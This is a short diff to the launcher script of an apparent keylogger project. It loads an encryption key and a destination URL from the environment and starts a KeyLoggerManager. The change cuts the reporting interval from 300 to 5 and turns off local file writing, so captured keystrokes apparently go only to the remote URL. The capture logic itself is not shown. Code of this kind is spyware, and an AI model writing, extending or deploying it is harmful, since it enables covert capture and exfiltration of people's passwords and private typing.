@@ -1,13 +1,12 @@
 from os import getenv
-from dotenv import load_dotenv
 from Manager import KeyLoggerManager
+from dotenv import load_dotenv
 
 load_dotenv()
-
-encryption_key = getenv('encryption_key')
+encryption_key = getenv("encryption_key")
 url = getenv('URL')
 
-manager = KeyLoggerManager(300, encryption_key, url)
+manager = KeyLoggerManager(5, encryption_key, url, write_to_file=False)
 
 if __name__ == '__main__':
     manager.start()
